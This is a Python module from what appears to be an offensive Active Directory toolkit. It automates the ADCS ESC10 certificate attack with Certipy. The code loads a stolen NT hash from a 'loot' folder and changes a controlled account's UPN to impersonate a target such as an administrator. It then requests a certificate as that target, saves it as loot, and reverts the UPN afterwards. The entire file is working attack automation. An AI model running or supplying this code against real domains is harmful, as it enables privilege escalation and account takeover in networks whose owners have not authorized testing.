import os
from core.helpers import run_command, save_loot
from core.colors import blue, green, red

def abuse_esc10(session, template):
    print(blue("[*] Starting ESC10 Abuse - Case 1 (Kerberos)"), flush=True)

    # Ask user for controlled and target account
    controlled_user = input("[?] Enter the user you control (e.g., user2): ").strip()
    target_user = input("[?] Enter the user you want to impersonate (e.g., administrator): ").strip()

    # Step 1: Read NT hash from loot
    hash_file = f"loot/{controlled_user}.hash"
    print(blue(f"[*] Step 1: Loading NT hash from {hash_file}"), flush=True)
    if not os.path.exists(hash_file):
        print(red(f"[-] NT hash file not found. Run 'attack shadow {controlled_user}' first."), flush=True)
        return

    with open(hash_file, "r") as f:
        nt_hash = f.read().strip()

    if not nt_hash or nt_hash.lower() == "none":
        print(red("[-] NT hash is invalid or empty."), flush=True)
        return

    print(green(f"[+] Loaded NT hash for {controlled_user}: {nt_hash}"), flush=True)

    # Step 2: Change UPN of controlled user to target
    print(blue(f"[*] Step 2: Setting {controlled_user}'s UPN to {target_user}@{session.domain}"), flush=True)
    update_upn_cmd = (
        f"certipy-ad account update -u {session.username}@{session.domain} -p '{session.password}' "
        f"-user {controlled_user} -upn {target_user}@{session.domain}"
    )
    output, err = run_command(update_upn_cmd)
    print(output)
    if err:
        print(red(err), flush=True)

    # Step 3: Request certificate
    print(blue(f"[*] Step 3: Requesting certificate as {target_user}@{session.domain}"), flush=True)
    pfx_file = f"esc10_{target_user}.pfx"
    req_cmd = (
        f"certipy-ad req -u {controlled_user}@{session.domain} -hashes :{nt_hash} "
        f"-ca {session.adcs_metadata['cas'][0]['name']} -template {template} -out {pfx_file}"
    )
    output, err = run_command(req_cmd)
    print(output)
    if err:
        print(red(err), flush=True)

    if os.path.exists(pfx_file):
        with open(pfx_file, "rb") as f:
            save_loot(pfx_file, f.read(), binary=True)
        print(green(f"[+] Certificate saved to loot/{pfx_file}"), flush=True)
    else:
        print(red("[-] Failed to request certificate."), flush=True)

    # Step 4: Restore original UPN
    print(blue(f"[*] Step 4: Reverting {controlled_user}'s UPN back to {controlled_user}@{session.domain}"), flush=True)
    revert_cmd = (
        f"certipy-ad account update -u {session.username}@{session.domain} -p '{session.password}' "
        f"-user {controlled_user} -upn {controlled_user}@{session.domain}"
    )
    output, err = run_command(revert_cmd)
    print(output)
    if err:
        print(red(err), flush=True)
    else:
        print(green("[+] Successfully reverted UPN."), flush=True)

